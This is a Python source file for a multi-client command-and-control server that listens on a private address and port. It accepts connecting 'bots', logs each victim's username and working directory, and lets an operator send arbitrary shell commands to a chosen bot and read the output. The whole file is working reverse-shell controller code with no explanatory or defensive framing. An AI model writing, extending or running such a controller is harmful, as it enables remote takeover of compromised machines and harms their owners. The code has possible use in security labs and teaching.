import threading
import time
import queue
import socket
import os
from _thread import *
import random

def client_handler(connection, bots, qs, g_bot_id):
    # client handler
    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"


    # receiving the current working directory of the client
    cwd = connection.recv(BUFFER_SIZE)
    cwd = cwd.decode()

    whoami = connection.recv(BUFFER_SIZE)
    bot_id = str(g_bot_id)
    bots[bot_id] = whoami.decode() + " " + cwd
    input_q = queue.Queue()
    output_q = queue.Queue()
    qs[bot_id] = (input_q, output_q)
    connection.send(str(bot_id).encode())


    while True:
        # get the command from queue
        input_q, output_q = qs[bot_id]
        command = input_q.get()
        if command[0] != str(bot_id):
            input_q.put(command) # move on - wrong id
        else:
            command = command[1]
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            connection.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
            output = connection.recv(BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # enter results into outpt
            output_q.put(results)

def listener(connection, bots, qs):
    g_bot_id = 0
    while True:
        Client, address = connection.accept()
        g_bot_id += 1
        
        print('Connected to: ' + address[0] + ':' + str(address[1]))
        handle = threading.Thread(target=client_handler, args=(Client, bots, qs, str(g_bot_id), ), daemon=True)
        handle.start()
        time.sleep(1)
        print(bots)

def main():
    global list_of_ids, bots, qs
    list_of_ids = []
    bots = {}
    qs = {}
    ServerSocket = socket.socket()
    host = "172.22.1.1"
    port = 5003
    ThreadCount = 0
    try:
        ServerSocket.bind((host, port))
    except socket.error as e:
        print(str(e))

    print(f"Listening as {host}:{port} ...")
    ServerSocket.listen()
    while True:
        thread = threading.Thread(target=listener, args=(ServerSocket, bots, qs, ), daemon=True)
        thread.start()
        time.sleep(1)
        cmd_id = input("Enter computer id: ")
        if 'bots' in cmd_id:
            print(bots)
        elif 'exitall' in cmd_id:
            break
        else:
            try:
                input_q, output_q = qs[cmd_id]
                cmd_lit = input("Enter command: ")
                cmd = (cmd_id, cmd_lit)
                if 'exitall' in cmd_lit:
                    break
                elif 'bots' in cmd_lit:
                    print(bots)
                else:
                    input_q.put(cmd)
                print(output_q.get()) # print out the output
            except KeyError:
                print(f"There is not bot tied to this ID: {[str(x) for x in bots.keys()]}")

    ServerSocket.close()


if __name__ == "__main__":
    main()
